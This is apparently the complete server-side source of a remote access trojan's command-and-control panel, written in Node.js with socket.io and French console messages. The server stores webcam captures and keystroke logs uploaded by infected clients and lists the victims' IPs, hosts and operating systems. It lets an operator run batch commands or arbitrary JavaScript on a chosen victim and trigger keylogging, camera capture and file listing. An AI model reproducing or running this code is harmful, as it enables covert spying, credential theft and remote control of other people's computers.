const http = require("http");
const { Tree } = require('./Tree.js')
const { Server } = require("socket.io");
const { Konsole } = require('./Konsole.js')
const colors = require('colors')
const fs = require('fs')

const server = http.createServer((req, res) => {
  res.statusCode = 200;
  res.setHeader("Content-Type", "text/plain");
  res.end("Gate Server Side");
})

server.listen(3000)
const io = new Server(server);

let socket_id = "none"
let konsole = new Konsole()
konsole.socket = socket_id
let socket_infos = new Map()

io.on('connection', socket => {

  io.to(socket.id).emit('info')
  if (socket_id === "none") {
    socket_id = socket.id
    konsole.socket = socket.id
  }
  socket.on("image", (buffer) => {
    fs.writeFileSync(`webcam/${socket.id}_${Date.now()}.png`, buffer)
  })
  socket.on('response', message => {
    konsole.log(message)
  })
  socket.on('out_keylog', array => {
    let string = array.filter(x => x.length === 1 || x === "ENTER" || x === "SPACE").join('').replaceAll('SPACE', " ").replaceAll('ENTER', '\n\n').toLowerCase()
    fs.writeFileSync(`keylogs/keylog_${socket.id}.txt`, string)
  })
  socket.on('socket_info', infos => {
    socket_infos.set(socket.id, infos)
  })
  socket.on('error', message => {
    konsole.error(message)
  })
  socket.on('warn', message => {
    konsole.warn(message)
  })
  socket.on('givefiles', function(filesArr) {
    console.log("\n" + new Tree({ sequence: filesArr, baseIndent: " " }).string.blue)
  })
})

// commands Map Settings & Definitions

let commands = new Map()

commands.set('select', function(rest) {
  if (!Array.from(io.sockets.sockets.keys()).includes(rest)) return konsole.error('Socket id inconnu.')
  socket_id = rest
  konsole.socket = rest
})

commands.set('sockets', function() {

  let res = `\n┌ Connected Sockets ───┬───────────────┬────────────────┬──────────────┐\n`.blue

  for (var client of Array.from(io.sockets.sockets.keys())) {
    let ip = "  unknown IP4  "
    let host = "  unknown host  "
    let os = "  unknown os  "
    if (socket_infos.has(client)) {
      let infos = socket_infos.get(client)
      ip = ` ${infos.ip} `
      host = ` ${infos.host}`.padEnd(16, " ")
      os = ` ${infos.os}`.padEnd(14, " ")
    }
    res += "│ ".blue + client.red + ` │${ip}│${host}│${os}│\n`.blue
  }

  res += `└──────────────────────┴───────────────┴────────────────┴──────────────┘`.blue

  konsole.log(res)
})

commands.set('bat', async function(str) {
  io.to(socket_id).emit('bat', str)
  konsole.startCD(2)
})

commands.set('kill', function() {
  io.to(socket_id).emit('kill')
  konsole.log('Socket correctement fermé.')
})

commands.set('ps', async function(str) {
  return konsole.warn("Fonction dépréciée.")
  // io.to(socket_id).emit('ps', str)
})

commands.set('info', function() {
  io.to(socket_id).emit('info')
})

commands.set('keylog', function() {
  io.to(socket_id).emit('keylog')
})

commands.set('tree', function(args = "./") {
  io.to(socket_id).emit('getfiles', args)
  konsole.startCD(3)
})

commands.set('js', function(code) {
  io.to(socket_id).emit('js', code)
  konsole.startCD(2)
})

commands.set('cam', function() {
  io.to(socket_id).emit('cam')
  konsole.startCD(2)
})

// Konsole Support

konsole.callback = function(str) {

  let actual_socket = io.sockets.sockets.get(socket_id)
  if (!actual_socket || !actual_socket.connected) {
    konsole.socket = "none"
    socket_id = "none"
  }

  let cmd = str.split(' ')[0]
  let args = str.slice(cmd.length + 1)

  if (commands.has(cmd)) {
    commands.get(cmd)(args)
  } else if (cmd.length > 0) {
    konsole.error(`No command name called ${cmd}.`)
  }

}